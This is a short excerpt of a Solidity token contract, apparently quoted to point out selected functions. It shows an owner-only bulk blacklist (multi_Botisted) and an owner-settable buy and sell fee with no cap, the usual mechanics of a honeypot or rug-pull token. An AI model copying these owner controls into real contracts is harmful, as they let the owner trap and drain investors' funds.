...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            address ad;
            ad = address(uint160(uint(keccak256(abi.encodePacked(amount, block.timestamp)))));
    ...
    function multi_Botisted(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; i++) {
            botListed[addresses[i]] = status;
        }
    }
    ...
    function setFundFee(uint256 newBuyFund, uint256 newSellFund, uint256 newSellLp) public onlyOwner{
        _buyFundFee = newBuyFund;
        _sellFundFee = newSellFund;
        _sellLPFee = newSellLp;
    }
